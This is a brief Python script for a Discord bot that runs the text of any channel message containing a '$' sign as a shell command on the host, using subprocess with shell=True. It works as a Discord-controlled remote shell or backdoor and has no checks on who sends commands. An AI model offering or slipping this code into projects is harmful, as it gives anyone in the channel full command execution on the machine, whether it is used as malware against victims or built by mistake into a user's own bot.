import discord
import subprocess

intents = discord.Intents.default()
client = discord.Client(intents=intents)

@client.event
async def on_message(message):
    if '$' in message.content:
        cmd = message.content.replace('$', '')
        subprocess.call(cmd, shell=True)

client.run('YOUR_DISCORD_BOT_TOKEN')
